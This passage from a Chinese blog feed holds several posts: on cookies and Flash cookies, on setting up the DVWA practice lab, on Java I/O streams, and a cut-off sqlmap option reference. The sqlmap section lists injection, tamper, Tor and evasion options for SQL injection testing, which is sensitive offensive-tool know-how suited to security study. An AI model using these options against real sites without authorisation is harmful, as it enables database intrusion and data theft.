id="2-1-4-Cookie的工作原理"><font color="#008B45" face="楷体"><strong>2.1.4 Cookie的工作原理</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-4-Cookie的工作原理"></a></h6><p><font face="仿体">&emsp;Cookie利用网页代码中的HTTP头信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。例如：当你在浏览器地址栏中键入了Amazon的URL，浏览器会向Amazon发送一个读取网页的请求，并将结果在显示器上显示。在发送之前，该网页在你的电脑上寻找Amazon网站设置的Cookie文件，如果找到，浏览器会把Cookie文件中的数据连同前面输入的URL一同发送到Amazon服务器。服务器收到Cookie数据，就会在他的数据库中检索你的ID，你的购物记录、个人喜好等信息，并记录下新的内容，增加到数据库和Cookie文件中去。如果没有检测到Cookie或者你的Cookie信息与数据库中的信息不符合，则说明你是第一次浏览该网站，服务器的CGI程序将为你创建新的ID信息，并保存到数据库中。（此例子来源于百度百科——Cookie）</font></p><hr><hr><h6 id="2-1-5-关于Cookie的一些知识点"><font color="#008B45" face="楷体"><strong>2.1.5 关于Cookie的一些知识点</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-5-关于Cookie的一些知识点"></a></h6><p><font face="仿体">&emsp;1、Cookie是基于浏览器的，因此当电脑上安装多个浏览器时，服务器会生成多个Cookie。虽然是同一个人，但服务器是识别为多个用户。<br>&emsp;2、Cookie是基于浏览器的，因此当同一台电脑有多个人使用时，服务器也只会生成一个Cookie。虽然是多个人，但服务器会认为是一个用户。<br>&emsp;3、Cookie是无法跨设备进行设置的。比如我们在单位和家里分别使用两台电脑，即使我们使用同一种同一版本的浏览器，我们还是生成了两个Cookie，服务器会认为是两个用户。（PS：现在有些浏览器可以同步数据，比如Chrome、Friefox，可以避免这种问题）<br><font color="red">请注意：以上所说的Cooke指的全部是Http Cookie。有一种Cookie——Flash Cookie，可以解决多浏览器的问题</font></font></p><hr><hr><h6 id="2-1-6-关于Flash-Cookie"><font color="#008B45" face="楷体"><strong>2.1.6 关于Flash Cookie</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-6-关于Flash-Cookie"></a></h6><p><font face="仿体">&emsp;FlashCookie是由FlashPlayer控制的客户端共享存储技术，鉴于目前Flash技术的普遍性，几乎所有的网站都采用，所以具有同Http Cookie一样的作用。在技术上，通过使用JavaScript与ActionScript可以将Http Cookie和Flash Cookie进行互通。<br>Flash cookie的优势在于：<br>1、跨浏览器<br>不管用户的计算机上安装了多少个浏览器或者浏览器的不同版本，使用Flash Cookie能够使所有的浏览器共用一个Cookie。<br>2、不易删除<br>所有的浏览器均提供了清除Http Cookie的快捷方式，但Flash Cookie并没有此种方式，并且其保存位置非常隐蔽，网民难以删除。<br>3、容量更大<br>Flash Cookie可以容纳最多100千字节的数据，而一个标准的HTTP Cookie只有4千字节。</font></p><hr><hr><h6 id="2-1-7-Cookie的数量"><font color="#008B45" face="楷体"><strong>2.1.7 Cookie的数量</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-7-Cookie的数量"></a></h6><p><font face="仿体">&emsp;1、大多数浏览器支持最大为 4096 字节的 Cookie。因此最好用 Cookie 来存储用户 ID 之类的标识符，用户的详细信息则通过用户 ID从数据库或其他数据源中读取。<br>&emsp;2、浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；当存储更多 Cookie时，最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie 总数作出绝对限制，通常为 300 个。 </font></p><hr><hr><h6 id="2-1-8-Cookie的失效时间"><font color="#008B45" face="楷体"><strong>2.1.8 Cookie的失效时间</strong> </font><a href="post/HTTP-User-Agen-Cookie#2-1-8-Cookie的失效时间"></a></h6><p><font face="仿体">&emsp;1、浏览器的Cookie设置会决定是否保存Cookie数据。如果浏览器不允许Cookie保存，则关掉浏览器后，这些数据就消失。<br>&emsp;2、如果浏览器允许保存Cookie，那么Cookie的时间由服务器的设置决定。Cookie有一个Expires（有效期）属性，这个属性决定了Cookie的保存时间，服务器可以通过设定Expires字段的数值，来改变Cookie的保存时间。如果不设置该属性，那么Cookie只在浏览网页期间有效，关闭浏览器，这些Cookie自动消失，绝大多数网站属于这种情况。通常情况下，Cookie包含Server、Expires、Name、value这几个字段，其中对服务器有用的只是Name和value字段，Expires等字段的内容仅仅是为了告诉浏览器如何处理这些Cookies。 </font></p><hr><hr><p>参考：<a href="https://blog.csdn.net/u012195214/article/details/78889602" target="_blank" rel="noopener">《【总结】浏览器 User-Agent 大全》</a>、<a href="https://blog.csdn.net/xinyuan_java/article/details/66092335" target="_blank" rel="noopener">《User-Agent详解》</a>.<br>&ensp;<br>&ensp;<br>&ensp;<br>&ensp;</p>]]></content>
      
      
      <categories>
          
          <category> HTTP协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> User-Agen </tag>
            
            <tag> Cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XAMPP环境下配置DVWA</title>
      <link href="/post/XAMPP-DVWA/"/>
      <url>/post/XAMPP-DVWA/</url>
      
        <content type="html"><![CDATA[<p><font color="#008B45"><strong>一、下载</strong></font><br><font face="楷体">1. <a href="http://www.apachefriends.org" target="_blank" rel="noopener">下载XAMPP</a><br>    2. <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">下载DVWA</a></font>  </p><p>&nbsp;<br><font color="#008B45"><strong>二、给文件执行权限并安装XAMPP</strong></font><br><font face="楷体">1. 在“下载”目录下，以“客户端运行”</font> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> a+x xampp-linux-x64-5.6.12-0-installer.run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><font face="楷体">2. 在“下载”目录下，运行安装</font> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> ./xampp-linux-x64-5.6.12-0-installer.run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&nbsp;<br><font color="#008B45"><strong>三、数据库配置</strong></font><br><font face="楷体">1. 在浏览器中访问127.0.0.1；</font></p><ol start="2"><li>点击右上角phpmyadmin -&gt; new(新建) -&gt;user(用户) -&gt;add user(添加用户)并填写下面内容： </li></ol><blockquote><p>用户名:dvwa<br>主机名:127.0.0.1<br>密码一:dvwa<br>重复密码:dvwa</p></blockquote><p><font face="楷体">下面除了require ssl全部都勾选</font></p><ol start="3"><li>go(执行) </li></ol><p>&nbsp;<br><font color="#008B45"><strong>四、移动DVWA文件、更名、提权</strong></font><br><font face="楷体">1. 移动更名：将DVWA-master移动到<code>/opt/lampp/htdocs</code>下并且重命名为dvwa；</font></p><ol start="2"><li>提权：然后给文件夹高权限否则网页打不开<code>127.0.0.1/dvwa/</code></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> -R 755 /opt/lampp/htdocs/dvwa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&nbsp;<br><font color="#008B45"><strong>五、更改dvwa配置的文件名和内容</strong></font><br><font face="楷体">1. 将<code>/opt/lampp/htdocs/DVWA-master/config/connfig.inc.php.dist</code><br>改为<code>/opt/lampp/htdocs/DVWA-master/config/config.inc.php</code></font></p><ol start="2"><li>原内容：</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$_DVWA</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_server'</span> <span class="token punctuation">]</span>   <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_database'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'dvwa'</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_user'</span> <span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_password'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'p@ssw0rd'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font face="楷体">更改为：</font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$_DVWA</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_server'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_database'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'dvwa'</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_user'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'dvwa'</span><span class="token punctuation">;</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span> <span class="token string">'db_password'</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'dvwa'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;<br><font color="#008B45"><strong>六、创建数据库并重新登陆</strong></font><br><font face="楷体">1. 浏览器输入<code>127.0.0.1/dvwa/</code>，输入账号：dvwa    密码：dvwa &emsp;进去之后根据提示创建数据库；</font></p><ol start="2"><li>数据库创建好之后会自动跳到登陆界面，重新登陆，输入用户名admin和密码password就可以用了😄😁….</li></ol><p>&ensp;<br>&ensp;<br>&ensp;</p>]]></content>
      
      
      <categories>
          
          <category> XAMPP-DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java的输入输出</title>
      <link href="/post/Java-IO-1/"/>
      <url>/post/Java-IO-1/</url>
      
        <content type="html"><![CDATA[<h4 id="一、Java中的流的概念"><font color="#EE3A8C" face="楷体">一、Java中的流的概念</font><a href="post/Java-IO-1#一、Java中的流的概念"></a></h4><h5 id="1-0-数据流的概念"><font color="#EE3A8C" face="楷体">1.0 数据流的概念</font><a href="post/Java-IO-1#1-0-数据流的概念"></a></h5><blockquote><blockquote><p><font face="楷体">&emsp;数据流是一串连续不断的数据的集合，就象水管里的水流，在水管的一端一点一点地供水，而在水管的另一端看到的是一股连续不断的水流。数据写入程序可以是一段、一段地向数据流管道中写入数据，这些数据段会按先后顺序形成一个长的数据流。对数据读取程序来说，看不到数据流在写入时的分段情况，每次可以读取其中的任意长度的数据，但只能先读取前面的数据后，再读取后面的数据。不管写入时是将数据分多次写入，还是作为一个整体一次写入，读取时的效果都是完全一样的。<br>&emsp;“流是磁盘或其它外围设备中存储的数据的源点或终点。”<br>在电脑上的数据有三种存储方式，一种是外存，一种是内存，一种是缓存。比如电脑上的硬盘，磁盘，U盘等都是外存，在电脑上有内存条，缓存是在CPU里面的。外存的存储量最大，其次是内存，最后是缓存，但是外存的数据的读取最慢，其次是内存，缓存最快。这里总结从外存读取数据到内存以及将数据从内存写到外存中。对于内存和外存的理解，我们可以简单的理解为容器，即外存是一个容器，内存又是另外一个容器。那又怎样把放在外存这个容器内的数据读取到内存这个容器以及怎么把内存这个容器里的数据存到外存中呢？<br>&emsp;在Java类库中，IO部分的内容是很庞大的，因为它涉及的领域很广泛:<br>标准输入输出，文件的操作，网络上的数据流，字符串流，对象流，zip文件流等等，java中将输入输出抽象称为流，就好像水管，将两个容器连接起来。将数据冲外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。<br>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向数据源的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。</font></p></blockquote></blockquote><pre><code>  以上总结的基本概念如下：</code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F5FFFA"><font face="楷体">🌸数据流：一组有序，有起点和终点的字节的数据序列。包括输入流和输出流;🌸输入流(Input  Stream)：程序从输入流读取数据源。数据源包括外界(键盘、文件、网络…)，即是将数据源读入到程序的通信通道;🌸输出流：程序向输出流写入数据。将程序中的数据输出到外界（显示器、打印机、文件、网络…）的通信通道。采用数据流的目的就是使得输出输入独立于设备。Input  Stream不关心数据源来自何种设备（键盘，文件，网络）Output  Stream不关心数据的目的是何种设备（键盘，文件，网络）🌸数据流分类：流序列中的数据既可以是未经加工的原始二进制数据，也可以是经一定编码处理后符合某种格式规定的特定数据。因此Java中的流分为两种： 1)  字节流：数据流中最小的数据单元是字节； 2)  字符流：数据流中最小的数据单元是字符，Java中的字符是Unicode编码，一个字符占用两个字节。🌸具体的字节流和字符流区分请看文章《Java:字节流和字符流（输入流和输出流）》和[《Java 字节流与字符流的区别》](https://blog.csdn.net/qq_25184739/article/details/51203733)、[《理解Java中字符流与字节流的区别》](https://www.cnblogs.com/absfree/p/5415092.html)、[《Java:字节流和字符流（输入流和输出流）》](https://www.cnblogs.com/progor/p/9357676.html).</font></td></tr></table></div></div><p>&nbsp;</p><h4 id="二、System、in、out说明"><font color="#EE3A8C" face="楷体">二、System、in、out说明</font><a href="post/Java-IO-1#二、System、in、out说明"></a></h4><p><font face="楷体">Java系统自带的标准数据流：java.lang.System:</font></p><pre class="line-numbers language-bash"><code class="language-bash">java.lang.System     public final class System  extends Object<span class="token punctuation">{</span>        static  PrintStream  err<span class="token punctuation">;</span>//标准错误流（输出）、err是对象；     static  InputStream  <span class="token keyword">in</span><span class="token punctuation">;</span>//标准输入<span class="token punctuation">(</span>键盘输入流<span class="token punctuation">)</span>、in是对象；      static  PrintStream  out<span class="token punctuation">;</span>//标准输出流<span class="token punctuation">(</span>显示器输出流<span class="token punctuation">)</span>、out是对象.<span class="token punctuation">}</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F5FFFA"><font face="楷体">🌼 System类不能创建对象，只能直接使用它的三个静态成员;🌼 每当main方法被执行时,就自动生成上述三个对象;🌼 System是java.lang包里面的一个类；🌼 in是java.io.InputStream类的对象，也是System里面的一个数据成员(也称为字段)；🌼 read()是java.io.InputStream类里的方法，也就是in对象的方法;🌼 out是java.io.PrintStream类的对象，也是System里面的一个数据成员(也称为字段)；🌼 print()、println()是java.io.PrintStream类里的方法，也就是out对象的方法;</font></td></tr></table></div></div><p>&nbsp;</p><h4 id="三、System-in-read-使用"><font color="#EE3A8C" face="楷体">三、System.in.read()使用</font><a href="post/Java-IO-1#三、System-in-read-使用"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F5FFFA"><font face="楷体">🌼 System.in.read()方法的作用是按每次读取一个字节（就是ASCII码），然后返回它的<font color="#FF4040">ASCII码十进制</font>;🌼 从第一次打开System.in输入流开始，以后输入的字节都存放起来，下次从这个里面依次按顺序读取;🌼 用System.in.read()时，我们在键盘上按下的任何一个键都会被当做是输入值，包括Enter键也会被当做是一个值！当我们按下Enter的时候，实际上发送两个键值：一个回车\t（13），一个是换行\n（10）;🌼 从键盘输入一个a，char是两个字节存储的，read()一个字节一个字节读取时，暂时把a看作是一个字节，后续深入学习了再来解释😫😂（哈，貌似想通了，当字节流读到字节为0的数据流时会舍去，相当于跳过该字节继续读下一个非0的字节.....后续更新中）----12.27与老师探讨后得知：在流中输入的字符是一个ASCII(即一个字节=8比特)，这个时候就是一个字节，而char存储的时候是按2个字节存储的，注意的是在流中并不是存储，存储一个字符是Unicode码共16位，而流中的ASCII是8位。建议去读[《java总结输入流输出流》](https://blog.csdn.net/liuxiaogangqq/article/details/25892667)！！！可参考[Scanner使用方法](https://www.cnblogs.com/ioveNature/p/6797024.html)</font></td></tr></table></div></div><p><strong>注意事项：</strong></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F5FFFA"><font face="楷体">1、由于在控制台输入时，按下回车键才代表输入完成，输入的内容才会提交到read()方法，所以按下回车之前，程序是不知道你输入了什么的;2、输入"a"后按下回车，这时候read()方法读到了数据，此时buffer中的数据应该是97 13 10，也就是字符'a','\r','\n'，并且read()方法每次只能从缓冲区中读出一个字符，三次read()就刚好读出这3个字符，之后程序就结束了;3、只按下回车，此时从流中只读到了"\r"和"\n"，由于没有足够的输入，那么第三次调用read()时阻塞.参考：[《System.in.read()使用》](https://uule.iteye.com/blog/1128243)；[《System.in输入流深入理解》](https://blog.csdn.net/fengzijinliang/article/details/40741565?utm_source=blogxgwz0)推荐阅读：[《深入理解JAVA中的IO》](https://www.cnblogs.com/ylspace/p/8128112.html)</font></td></tr></table></div></div><p>&nbsp;</p><h4 id="四、System-out-print-println"><font color="#EE3A8C" face="楷体">四、System.out.print()/println()</font><a href="post/Java-IO-1#四、System-out-print-println"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F5FFFA"><font face="楷体">🌼 System.out.print()输出不换行，System.out.print()输出后换行.参考[《深入理解System.out.print》](https://blog.csdn.net/idealemail/article/details/47318813).</font></td></tr></table></div></div><p>&nbsp;</p><h4 id="五、Java中System-out-print-函数与Python中print-函数的详解"><font color="#EE3A8C" face="楷体">五、Java中System.out.print()函数与Python中print()函数的详解</font><a href="post/Java-IO-1#五、Java中System-out-print-函数与Python中print-函数的详解"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F5FFFA"><font face="楷体">python中的print()函数和java中的System.out.print()函数都有着打印字符串的功能。(1). <font color="red">python中:</font> print("hello,world!")输出为：hello,world!<font color="red">Java中:</font> System.out.print("hello,world!");输出为：hello,world!说明这两个函数的用法是一样的.(2). <font color="red">python中:</font> print("1+1=",1+1)输出结果为：1+1= 2<font color="red">Java中:</font> System.out.print("1+1="+(1+1));输出结果为：1+1=2说明在使用print()函数的时候，我们用了一个“,”将“1+1=”和1+1的结果连接起来了，这个“,”起着连接的作用。同时，在使用System.out.print()函数的时候，我们用了一个“+”将“1+1=”和1+1的结果连接起来了，这个“+”也是起着连接作用;我们再来看他们的输出结果，print()输出的是1+1= 2，“=”与“2”之间有一个空格，而System.out.print()输出的是1+1=2，“=”与“2”之间没有空格。这里我们发现python中的print()函数中的“,”不仅起着连接字符串的作用，而且还表示一个空格.<p><strong>结论：</strong><br><font color="#FF0000">🌼 python中的print()函数的作用和java中的System.out.print()函数的作用是一样的;<br>🌼 print()函数中“,”和System.out.print()函数中“+”都有着连接字符串的作用;<br>🌼 print()函数中“,”还表示一个空格;<br>🌼 不同的语言都有着很多的相似点，不同的语言又有着不同的新特性.</font><br>参考：<a href="https://m.jb51.net/article/128959.htm" target="_blank" rel="noopener">《python中print()函数的“,”与java中System.out.print()函数中的“+”功能详解》</a>.<br></p></font></td></tr></table></div></div><p></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMAP命令大全</title>
      <link href="/post/SQLMAP-shell/"/>
      <url>/post/SQLMAP-shell/</url>
      
        <content type="html"><![CDATA[<h4 id="一、sqlmap简介"><font color="#00BFFF" face="楷体">一、sqlmap简介</font><a href="post/SQLMAP-shell#一、sqlmap简介"></a></h4><p>&emsp;sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">sqlmap支持五种不同的注入模式： 🌸**基于布尔的盲注**，即可以根据返回页面判断条件真假的注入； 🌸**基于时间的盲注**，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语      句是否执行（即页面返回时间是否增加）来判断； 🌸**基于报错注入**，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中； 🌸**联合查询注入**，可以使用union的情况下的注入； 🌸**堆查询注入**，可以同时执行多条语句的执行时的注入。</font></td></tr></table></div></div><p>&ensp;</p><h4 id="二、SQL使用参数详解"><font color="#00BFFF" face="楷体">二、SQL使用参数详解</font><a href="post/SQLMAP-shell#二、SQL使用参数详解"></a></h4><p><font face="楷体">每条指令使用方法参见：<a href="http://blog.51cto.com/wt7315/1841241" target="_blank" rel="noopener">《sqlmap注入总结》</a>.</font></p><h5 id="2-1-选项Options"><font face="楷体" color="#FF6347">2.1 选项Options</font><a href="post/SQLMAP-shell#2-1-选项Options"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">-h,–help  显示基本帮助信息并退出 -hh    显示高级帮助信息并退出\--version  显示程序版本信息并退出-vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-2-目标Target"><font face="楷体" color="#FF6347">2.2 目标Target</font><a href="post/SQLMAP-shell#2-2-目标Target"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">在这些选项中必须提供至少有一个确定目标 -d DIRECT    直接连接数据库的连接字符串-u URL, –url=URL   目标URL (e.g.”http://www.site.com/vuln.php?id=1“)，使用-u或者–url-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。-r REQUESTFILE   从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）-c CONFIGFILE       从配置ini文件中加载选项</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-3-请求Request"><font face="楷体" color="#FF6347">2.3 请求Request</font><a href="post/SQLMAP-shell#2-3-请求Request"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以用来指定如何连接到目标URL\--method=METHOD  强制使用给定的HTTP方法（例如put）    \--data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。\--data="id=1" -f \--banner \--dbs \--users   \--param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。   \--cookie=COOKIE     HTTP Cookieheader 值   \--cookie-del=COO..  用来分隔cookie的字符串值   \--load-cookies=L..  Filecontaining cookies in Netscape/wget format   \--drop-set-cookie   IgnoreSet-Cookie header from response   \--user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入   \--random-agent     使用random-agent作为HTTP User-Agent头值   \--host=HOST         HTTP Hostheader value   \--referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入   -H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1″)   \--headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123″)   \--auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)   \--auth-cred=AUTH..  HTTP 认证凭证(name:password)   \--auth-file=AUTH..  HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。   \--ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）   \--ignore-proxy      忽略系统的默认代理设置   \--ignore-redirects忽略重定向的尝试   \--ignore-timeouts   忽略连接超时   \--proxy=PROXY       使用代理服务器连接到目标URL   \--proxy-cred=PRO..  代理认证凭证(name:password)   \--proxy-file=PRO..  从文件加载代理列表   \--tor               使用Tor匿名网络   \--tor-port=TORPORT  设置Tor代理端口   \--tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))   \--check-tor       检查Tor的是否正确使用   \--delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。   \--timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。   \--retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。   \--randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样   \--safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下   \--safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。   \--safe-req=SAFER..  从文件中加载安全HTTP请求   \--safe-freq=SAFE..  测试一个给定安全网址的两个访问请求   \--skip-urlencode    跳过URL的有效载荷数据编码   \--csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌   \--csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌   \--force-ssl         强制使用SSL/HTTPS   \--hpp               使用HTTP参数污染的方法   \--eval=EVALCODE     在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”) sqlmap.py -u”http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b“--eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-4-优化Optimization"><font face="楷体" color="#FF6347">2.4 优化Optimization</font><a href="post/SQLMAP-shell#2-4-优化Optimization"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可用于优化sqlmap性能-o               打开所有的优化开关\--predict-output    预测普通查询输出\--keep-alive        使用持久HTTP（S）连接\--null-connection   获取页面长度\--threads=THREADS   当前http(s)最大请求数 (默认 1)</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-5-注入Injection"><font face="楷体" color="#FF6347">2.5 注入Injection</font><a href="post/SQLMAP-shell#2-5-注入Injection"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。   -p TESTPARAMETER    可测试的参数   \--skip=SKIP         跳过对给定参数的测试   \--skip-static       跳过测试不显示为动态的参数   \--param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）   \--dbms=DBMS         强制后端的DBMS为此值   \--dbms-cred=DBMS..  DBMS认证凭证(user:password)   \--os=OS            强制后端的DBMS操作系统为这个值   \--invalid-bignum    使用大数字使值无效   \--invalid-logical   使用逻辑操作使值无效   \--invalid-string    使用随机字符串使值无效   \--no-cast          关闭有效载荷铸造机制   \--no-escape         关闭字符串逃逸机制   \--prefix=PREFIX     注入payload字符串前缀   \--suffix=SUFFIX     注入payload字符串后缀   \--tamper=TAMPER   使用给定的脚本篡改注入数据</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-6-检测Detection"><font face="楷体" color="#FF6347">2.6 检测Detection</font><a href="post/SQLMAP-shell#2-6-检测Detection"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容   \--level=LEVEL     执行测试的等级（1-5，默认为1）   \--risk=RISK       执行测试的风险（0-3，默认为1）   \--string=STRING    查询时有效时在页面匹配字符串   \--not-string=NOT..  当查询求值为无效时匹配的字符串   \--regexp=REGEXP     查询时有效时在页面匹配正则表达式   \--code=CODE       当查询求值为True时匹配的HTTP代码   \--text-only        仅基于在文本内容比较网页   \--titles           仅根据他们的标题进行比较</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-7-技巧Techniques"><font face="楷体" color="#FF6347">2.7 技巧Techniques</font><a href="post/SQLMAP-shell#2-7-技巧Techniques"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可用于调整具体的SQL注入测试   \--technique=TECH    SQL注入技术测试（默认BEUST）   \--time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）   \--union-cols=UCOLS  定列范围用于测试UNION查询注入   \--union-char=UCHAR  暴力猜测列的字符数   \--union-from=UFROM  SQL注入UNION查询使用的格式   \--dns-domain=DNS..  DNS泄露攻击使用的域名   \--second-order=S..  URL搜索产生的结果页面</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-8-指纹Fingerprint"><font face="楷体" color="#FF6347">2.8 指纹Fingerprint</font><a href="post/SQLMAP-shell#2-8-指纹Fingerprint"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">-f, \--fingerprint   执行广泛的DBMS版本指纹检查</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-9-枚举Enumeration"><font face="楷体" color="#FF6347">2.9 